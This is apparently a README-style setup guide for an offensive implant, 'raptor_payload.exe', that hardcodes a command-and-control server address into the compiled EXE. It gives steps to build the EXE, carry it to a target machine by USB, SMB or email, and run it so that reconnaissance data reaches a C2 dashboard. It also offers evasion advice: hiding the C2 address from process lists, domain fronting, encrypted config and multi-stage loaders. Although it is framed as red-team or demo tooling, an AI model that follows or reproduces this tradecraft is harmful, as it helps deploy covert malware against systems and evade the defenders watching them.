# Hardcoded C2 Setup Guide

The payload now uses a **hardcoded C2 server address** - no command-line arguments needed!

## 🎯 Quick Setup

### Step 1: Update C2 Server Address

Edit `payload_cloud.py` line 37:

```python
# Before (default)
C2_SERVER = "http://127.0.0.1:8000"

# After (your actual server)
C2_SERVER = "http://your-server-ip:8000"
# or
C2_SERVER = "https://your-domain.com"
```

### Step 2: Build the EXE

```bash
./build_payload.sh
```

### Step 3: Run on Target

**No arguments needed!**

```cmd
# Old way (command-line argument)
raptor_payload.exe http://server:8000

# New way (hardcoded)
raptor_payload.exe
```

Just double-click or run the EXE directly!

---

## 🔧 Configuration Examples

### Local Testing (Default)
```python
C2_SERVER = "http://127.0.0.1:8000"
```

### VPS with IP Address
```python
C2_SERVER = "http://203.0.113.45:8000"
```

### Domain with SSL
```python
C2_SERVER = "https://c2.yourcompany.com"
```

### Custom Port
```python
C2_SERVER = "http://10.0.0.50:9000"
```

---

## 📍 Where to Find C2_SERVER

**File**: `payload_cloud.py`  
**Line**: 37  
**Section**: `CONFIGURATION - HARDCODED C2 SERVER`

```python
# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION - HARDCODED C2 SERVER
# ═══════════════════════════════════════════════════════════════════════════

C2_SERVER = "http://127.0.0.1:8000"  # ⚠️ CHANGE THIS!
```

---

## ✅ Advantages

1. **No user error** - Can't forget the URL or type it wrong
2. **Cleaner execution** - Just run `raptor_payload.exe`
3. **Less suspicious** - No command-line args to reveal intent
4. **Easier demos** - Double-click to run
5. **OPSEC friendly** - No URL visible in process list

---

## 🚀 Demo Workflow

### 1. Set Your C2 Server
```python
# In payload_cloud.py
C2_SERVER = "http://192.168.1.100:8000"
```

### 2. Build
```bash
./build_payload.sh
```

### 3. Transfer to Target
```bash
# USB, HTTP, SMB, email, etc.
cp dist/raptor_payload.exe /media/usb/
```

### 4. Execute on Target
```cmd
# Just run it - no arguments!
raptor_payload.exe
```

### 5. Watch C2 Dashboard
- Real-time reconnaissance data
- AI decision making
- Automated report generation

---

## 🔄 Changing C2 Server Later

If you need to change the C2 server:

1. Edit `C2_SERVER` in `payload_cloud.py`
2. Rebuild: `./build_payload.sh`
3. Deploy new EXE

**Note**: Can't change C2 server after EXE is built (it's compiled in)

---

## 🛡️ Security Note

The C2 server URL is embedded in the compiled EXE. It can be extracted by:
- Strings analysis: `strings raptor_payload.exe | grep http`
- Reverse engineering
- Network monitoring

For production red team ops, consider:
- Domain fronting
- Encrypted config
- Multi-stage payload (small loader + remote config)

---

## 📝 Verification

After building, verify the hardcoded URL:

```bash
# Check what's compiled in
strings dist/raptor_payload.exe | grep -A2 "http"

# Should show your C2_SERVER value
```

---

## 💡 Pro Tips

1. **Use domain names** instead of IPs (more flexible, can change backend)
2. **Enable HTTPS** for encrypted C2 traffic
3. **Test locally first** with `127.0.0.1:8000`
4. **Build fresh EXE** for each engagement with unique C2 URL
5. **Keep source** to rebuild with different C2 servers as needed

---

**Last Updated**: November 2025
